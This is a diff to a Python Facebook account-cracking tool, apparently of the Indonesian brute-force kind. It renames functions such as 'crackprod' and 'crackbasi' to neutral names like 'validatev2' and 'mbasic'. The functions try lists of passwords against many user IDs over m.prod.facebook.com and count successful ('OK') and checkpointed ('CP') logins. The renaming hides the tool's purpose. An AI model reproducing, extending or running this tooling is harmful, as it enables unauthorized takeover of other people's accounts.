@@ -1179,13 +1179,13 @@ def metslow():
                 else:
                     pass
                 if "validatev1" in method:
-                    pool.submit(vipernew,idf,pwv,'m.prod.facebook.com')
+                    pool.submit(validatev1,idf,pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(crackprod,idf,pwv)
+                    pool.submit(validatev2,idf,pwv)
                 elif "reguler" in method:
                     pool.submit(reguler,idf,pwv)
                 elif "mbasic" in method:
-                    pool.submit(crackbasi,idf,pwv)
+                    pool.submit(mbasic,idf,pwv)
                 else:
                     pool.submit(reguler,idf,pwv)
     print("")
@@ -1246,13 +1246,13 @@ def metcepaggt():
                         pwv.append(xpwd)
                 else:pass
                 if "validatev1" in method:
-                    pool.submit(vipernew,idf,pwv,'m.prod.facebook.com')
+                    pool.submit(validatev1,idf,pwv,'m.prod.facebook.com')
                 elif "validatev2" in method:
-                    pool.submit(crackprod,idf,pwv)
+                    pool.submit(validatev2,idf,pwv)
                 elif "reguler" in method:
                     pool.submit(reguler,idf,pwv)
                 elif "mbasic" in method:
-                    pool.submit(crackbasi,idf,pwv)
+                    pool.submit(mbasic,idf,pwv)
                 else:
                     pool.submit(reguler,idf,pwv)
     print("")
@@ -1322,13 +1322,13 @@ def metcepat():
                     else:pass
                     # Memanggil metode yang sesuai
                     if "validatev1" in method:
-                        pool.submit(vipernew, idf, pwv, 'm.prod.facebook.com')
+                        pool.submit(validatev1, idf, pwv, 'm.prod.facebook.com')
                     elif "validatev2" in method:
-                        pool.submit(crackprod, idf, pwv)
+                        pool.submit(validatev2, idf, pwv)
                     elif "reguler" in method:
                         pool.submit(reguler, idf, pwv)
                     elif "mbasic" in method:
-                        pool.submit(crackbasi, idf, pwv)
+                        pool.submit(mbasic, idf, pwv)
                     else:
                         pool.submit(reguler, idf, pwv)
 
@@ -1352,7 +1352,7 @@ def metcepat():
 	
 	
 #---------->> METHODE-MPROD-ASYNC <<----------#
-def vipernew(idf,pwv,url):
+def validatev1(idf,pwv,url):
     global loop,ok,cp
     rr = random.randint
     viperid = random.choice(["id-ID,id;q=0.9","en-US,en;q=0.9","en-GB,en;q=0.9","bd-BD,bd;q=0.9"])
@@ -1435,7 +1435,7 @@ def vipernew(idf,pwv,url):
         except requests.exceptions.ConnectionError:time.sleep(31)
     loop+=1
 	
-def crackprod(idf,pwv):
+def validatev2(idf,pwv):
     global loop,ok,cp
     prog.update(des,description=f" {K2}•{H2} VALIDATE V2 {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
@@ -1495,7 +1495,7 @@ def crackprod(idf,pwv):
     loop+=1
 
 
-def crackbasi(idf,pwv):
+def mbasic(idf,pwv):
     global loop,ok,cp
     prog.update(des,description=f" {K2}•{H2} MBASIC {SE}{SE}{idf} [bold blue]{loop}[bold white]/[bold blue]{len(id2)} [bold green]OK : [bold green]{ok}  [bold white]-  [bold yellow]CP : [bold yellow]{cp}[white]")
     prog.advance(des)
